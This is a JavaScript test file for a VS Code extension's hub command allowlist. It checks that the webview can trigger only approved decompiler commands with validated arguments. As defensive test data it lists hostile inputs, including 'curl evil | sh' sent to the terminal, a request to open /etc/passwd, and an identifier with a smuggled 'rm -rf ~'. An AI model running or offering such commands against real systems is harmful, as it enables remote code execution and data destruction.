// SPDX-License-Identifier: AGPL-3.0-only
// #535 : le webview du hub ne peut déclencher que les commandes VS Code autorisées.
const { expect } = require('chai');
const sinon = require('sinon');
const proxyquire = require('proxyquire').noCallThru();
const { ALLOWED_HUB_COMMANDS, MAX_DECOMPILER_ID_LENGTH, checkHubCommand } = require('../static/hubCommandPolicy');

const DANGEROUS_REQUESTS = [
  ['send a shell command to the terminal', 'workbench.action.terminal.sendSequence', [{ text: 'curl evil | sh\n' }]],
  ['run a task', 'workbench.action.tasks.runTask', ['build']],
  ['install an extension', 'workbench.extensions.installExtension', ['evil.ext']],
  ['open an arbitrary URI', 'vscode.open', ['file:///etc/passwd']],
  ['another extension command', 'git.commit', []],
  ['a near-miss id', 'pileOuFace.decompilerAdd ', ['x']],
  ['prototype key', '__proto__', []],
  ['constructor key', 'constructor', []],
  ['empty id', '', []],
  ['non-string id', { toString: () => 'pileOuFace.showLogs' }, []],
];

describe('hub command policy (#535)', () => {
  for (const [label, command, args] of DANGEROUS_REQUESTS) {
    it(`refuses ${label}`, () => {
      expect(checkHubCommand(command, args).ok).to.equal(false);
    });
  }

  it('allows exactly the commands the front uses', () => {
    expect(Object.keys(ALLOWED_HUB_COMMANDS).sort()).to.deep.equal([
      'pileOuFace.decompilerAdd',
      'pileOuFace.decompilerEdit',
      'pileOuFace.decompilerOpenConfig',
      'pileOuFace.decompilerRemove',
      'pileOuFace.decompilerTest',
      'pileOuFace.showLogs',
    ]);
  });

  it('accepts the legitimate calls of the front', () => {
    expect(checkHubCommand('pileOuFace.decompilerAdd', [])).to.deep.equal({ ok: true, args: [] });
    expect(checkHubCommand('pileOuFace.decompilerOpenConfig', undefined)).to.deep.equal({ ok: true, args: [] });
    expect(checkHubCommand('pileOuFace.showLogs', null)).to.deep.equal({ ok: true, args: [] });
    for (const command of ['pileOuFace.decompilerEdit', 'pileOuFace.decompilerRemove', 'pileOuFace.decompilerTest']) {
      expect(checkHubCommand(command, [])).to.deep.equal({ ok: true, args: [] });
      expect(checkHubCommand(command, ['ghidra'])).to.deep.equal({ ok: true, args: ['ghidra'] });
      expect(checkHubCommand(command, 'my-tool.v2')).to.deep.equal({ ok: true, args: ['my-tool.v2'] });
    }
  });

  it('keeps every identifier the wizard or a hand-edited decompilers.json can produce', () => {
    // Only a lookup key in the user's own configuration: never executed.
    for (const id of ['a'.repeat(65), 'my_tool-2', 'Binja.Pro', 'outil maison']) {
      expect(checkHubCommand('pileOuFace.decompilerTest', [id]), id).to.deep.equal({ ok: true, args: [id] });
    }
  });

  const BAD_ARGS = [
    ['an object', [{ command: ['sh', '-c', 'x'] }]],
    ['two identifiers', ['ghidra', 'retdec']],
    ['an empty string', ['']],
    ['a control character', ['ghidra\nrm -rf ~']],
    ['a number', [42]],
    ['an oversized payload', ['a'.repeat(MAX_DECOMPILER_ID_LENGTH + 1)]],
  ];
  for (const [label, args] of BAD_ARGS) {
    it(`refuses ${label} as decompiler argument`, () => {
      expect(checkHubCommand('pileOuFace.decompilerTest', args).ok).to.equal(false);
    });
  }

  it('refuses arguments for a command that takes none', () => {
    expect(checkHubCommand('pileOuFace.decompilerAdd', ['ghidra']).ok).to.equal(false);
    expect(checkHubCommand('pileOuFace.showLogs', [{}]).ok).to.equal(false);
  });
});

describe('hubExecuteCommand handler (#535)', () => {
  afterEach(() => sinon.restore());

  function makeHandlers() {
    const executeCommand = sinon.stub().resolves(undefined);
    const posted = [];
    const staticHandlers = proxyquire('../static/staticHandlers', {
      vscode: {
        commands: { executeCommand },
        window: { showErrorMessage: sinon.stub() },
        workspace: { getConfiguration: () => ({ inspect: () => ({}) }) },
      },
      '../shared/utils': {
        detectPythonExecutable: () => '/usr/bin/python3',
        buildRuntimeEnv: () => ({}),
        logDebug: () => {},
        logWarning: sinon.stub(),
      },
      '../shared/sharedHandlers': { normalizeRawArchName: (v) => v },
      '../shared/authService': { AuthService: { getInstance: sinon.stub().returns({}) } },
      '../shared/authConfig': { resolveAuthServerUrl: () => 'http://localhost:8000' },
      './pluginState': { emptyPluginUiState: () => ({}), summarizePluginRuntimeState: (v) => v },
    });
    const handlers = staticHandlers({
      root: '/workspace',
      panel: { webview: { postMessage: (message) => posted.push(message) } },
      context: { globalState: { get: () => ({}), update: async () => {} }, secrets: {} },
      logChannel: null,
      storageDir: '/workspace-storage',
      globalDir: '/global-storage',
    });
    return { handlers, executeCommand, posted };
  }

  it('never runs a command outside the allowlist and answers with an error', async () => {
    const { handlers, executeCommand, posted } = makeHandlers();
    await handlers.hubExecuteCommand({
      command: 'workbench.action.terminal.sendSequence',
      requestId: 'r1',
      args: [{ text: 'id\n' }],
    });
    expect(executeCommand.called).to.equal(false);
    expect(posted).to.have.length(1);
    expect(posted[0]).to.include({ type: 'hubCommandResult', requestId: 'r1', status: 'error' });
  });

  it('never runs an allowed command with forged arguments', async () => {
    const { handlers, executeCommand, posted } = makeHandlers();
    await handlers.hubExecuteCommand({ command: 'pileOuFace.decompilerTest', requestId: 'r2', args: [{ command: ['sh', '-c', 'id'] }] });
    expect(executeCommand.called).to.equal(false);
    expect(posted[0]).to.include({ status: 'error' });
  });

  it('answers an empty command with a logged refusal', async () => {
    const { handlers, executeCommand, posted } = makeHandlers();
    await handlers.hubExecuteCommand({ command: '  ', requestId: 'r4' });
    expect(executeCommand.called).to.equal(false);
    expect(posted[0]).to.include({ type: 'hubCommandResult', requestId: 'r4', status: 'error' });
  });

  it('runs an allowed command with its validated arguments', async () => {
    const { handlers, executeCommand, posted } = makeHandlers();
    await handlers.hubExecuteCommand({ command: 'pileOuFace.decompilerTest', requestId: 'r3', args: ['ghidra'] });
    expect(executeCommand.calledOnceWithExactly('pileOuFace.decompilerTest', 'ghidra')).to.equal(true);
    expect(posted[0]).to.include({ status: 'done' });
  });
});
